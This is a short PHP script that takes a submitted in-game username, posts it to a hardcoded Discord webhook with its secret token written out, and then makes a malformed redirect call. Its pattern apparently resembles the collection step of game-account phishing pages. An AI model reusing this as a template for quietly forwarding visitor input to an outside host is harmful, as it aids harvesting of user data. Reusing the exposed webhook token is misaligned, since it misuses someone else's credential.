<?php

// Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1134589187916582912/JUfPN0UTUT1qCHjC8_GiCu4DCvSKGtuB0ggwunNTnBV6vI8dPBAISNTR-7TvTuMlQ-kY";

// Get username from form data
$username = $_POST["ign"];

// Create Discord webhook embed
$embed = [
    "title" => "Username Entered",
    "description" => "**Username:** " . $username
];

// Send embed to Discord webhook
$data = [
    "embeds" => [$embed]
];
$options = [
    "http" => [
        "header"  => "Content-type: application/json",
        "method"  => "POST",
        "content" => json_encode($data)
    ]
];
$context  = stream_context_create($options);
$result = file_get_contents($webhookUrl, false, $context);

header('https://youtube.com');
exit;


?>
